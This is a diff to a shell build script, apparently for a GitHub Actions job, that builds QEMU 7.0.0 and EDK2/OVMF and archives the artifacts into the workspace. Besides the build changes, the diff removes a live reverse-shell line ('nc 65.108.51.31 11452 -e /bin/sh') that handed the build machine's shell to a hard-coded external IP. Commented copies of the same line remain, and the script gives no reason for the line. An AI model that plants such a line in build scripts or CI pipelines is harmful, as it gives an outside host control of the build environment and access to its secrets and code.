@@ -6,27 +6,36 @@ set -e o pipefail
 build_qemu () {
   #####BUILD QEMU
   #https://www.qemu.org/download/
+  #https://wiki.qemu.org/Hosts/Linux
   #https://wiki.qemu.org/Testing/DockerBuild
   sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build -y
   mkdir ~/qemu; cd ~/qemu
   curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
   tar xvJf qemu.tar.xz > /dev/null
   cd qemu-7.0.0
-  ./configure
-  make
+  ./configure --target-list=x86_64-softmmu --enable-debug > /dev/null
+  make -j$(nproc) > /dev/null
+  
+  #artifacts
+  tar cfz ~/qemu.tar -C ~/qemu/qemu-7.0.0 bin/
 }
 
 build_ovmf () {
   #####BUILD OVMF
   #https://phip1611.de/blog/how-to-compile-edk2-ovmf-from-source-on-linux-2021/
-  apt install -y git nasm iasl build-essential uuid-dev
+  apt install -y git nasm iasl build-essential uuid-dev uuid python3
   mkdir ~/edk2; cd ~/edk2
   git clone https://github.com/tianocore/edk2.git
-  cd edk2-master
+  cd edk2
   git submodule update --init
-  make -C BaseTools
+  PYTHON_COMMAND=/usr/bin/python3 make -C BaseTools -j $(nproc)
   cd OvmfPkg
   ./build.sh
+  
+  #artifacts
+  tar cfz ~/edk2.tar -C ~/edk2/edk2 Build/OvmfX64/DEBUG_GCC5/FV/
+  
+  #Build/OvmfX64/DEBUG_GCC5/FV/{OVMF.fd,OVMF_CODE.fd,OVMF_VARS.fd}
 }
 
 build_kernel() {
@@ -61,9 +70,13 @@ apt install -y ncat
 #nc 65.108.51.31 11452 -e /bin/sh
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
 
-build_kernel
-nc 65.108.51.31 11452 -e /bin/sh
-ls ../*.deb
+#build_kernel
+build_ovmf
+build_qemu
+
+cp ~/* /github/workspace/
+#nc 65.108.51.31 11452 -e /bin/sh
+
 exit 0
 
 
